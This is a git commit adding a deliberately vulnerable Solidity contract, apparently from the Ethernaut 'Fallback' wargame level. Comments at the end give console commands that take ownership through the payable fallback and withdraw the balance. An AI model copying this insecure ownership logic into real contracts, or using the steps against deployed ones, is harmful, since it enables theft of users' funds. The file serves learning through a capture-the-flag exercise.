fa3227b0cd21d9e94263a78b9cf44a6a6697cf91
EzeChinonso <48421032+EzeChinonso@users.noreply.github.com>
2020-06-18 18:38:09 +0100

    Create fallback.sol

---
+++ fallback.sol
@@ -0,0 +1,46 @@
+pragma solidity ^0.4.18;
+
+import 'zeppelin-solidity/contracts/ownership/Ownable.sol';
+import 'openzeppelin-solidity/contracts/math/SafeMath.sol';
+
+contract Fallback is Ownable {
+  
+  using SafeMath for uint256;
+  mapping(address => uint) public contributions;
+
+  function Fallback() public {
+    contributions[msg.sender] = 1000 * (1 ether);
+  }
+
+  function contribute() public payable {
+    require(msg.value < 0.001 ether);
+    contributions[msg.sender] = contributions[msg.sender].add(msg.value);
+    if(contributions[msg.sender] > contributions[owner]) {
+      owner = msg.sender;
+    }
+  }
+
+  function getContribution() public view returns (uint) {
+    return contributions[msg.sender];
+  }
+
+  function withdraw() public onlyOwner {
+    owner.transfer(this.balance);
+  }
+
+  function() payable public {
+    require(msg.value > 0 && contributions[msg.sender] > 0);
+    owner = msg.sender;
+  }
+}
+
+//In console
+
+//To claim ownership of this contract we have to contribute > 0.001 ether
+//await contract.contribute.sendTransaction({value: toWei(.0009)});
+
+//then we call the callback function, this gives control over the contract
+//await contract.sendTransaction({value: 1})
+
+//to withdraw balance
+//await contract.withdraw()
